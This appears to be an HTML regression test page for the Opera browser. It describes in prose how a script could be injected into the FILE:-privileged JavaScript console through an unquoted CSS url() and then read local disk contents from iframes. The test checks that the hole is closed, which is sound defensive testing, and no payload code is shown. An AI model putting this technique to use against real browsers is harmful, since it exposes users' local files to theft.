<!-- Test: Executable content with FILE: privilege can be injected
       into JS console and can be used to read other content with
       FILE: privilege

     Using the JavaScript console and the CSS 'url' attribute, it was
     possible to insert JavaScript code for execution in the console
     (passing a javascript: url to the url attribute, and relying on
     missing quoting of the content).  Since the console code is
     loaded from the disk, it runs with privileges that allow it to
     access documents loaded from the disk, and functions that run in
     its context inherit this privilege.  At the same time, it is
     possible to insert iframe content into the attacker document
     (using DOM) that contains disk content.  The script injected into
     the console can read the contents of the iframe and show it or
     send it off somewhere.

     This test case tests that it is not possible to inject a script
     into the console (and for good measure, it also shows the attack
     on the directory listing).

     If the attack succeeds then an alert is shown; otherwise, there
     is no alert.

<p>If the attack is successful, you should see an alert box with a
listing of the root directory of your C: drive.  Otherwise, you should
see some iframes (some of which may show your disk content) but no
alert.
</p>

<p>NOTE!  This attack opens the JS console using the syntax
file://localhost/console.html.  For it to work, you must use an Opera
whose working directory contains console.html, as do many normal
installations of Opera (but not all).  If you get an alert 'can't open
file' then you must change your installation to perform the test
properly.  (I really ought to fix that.)</p>
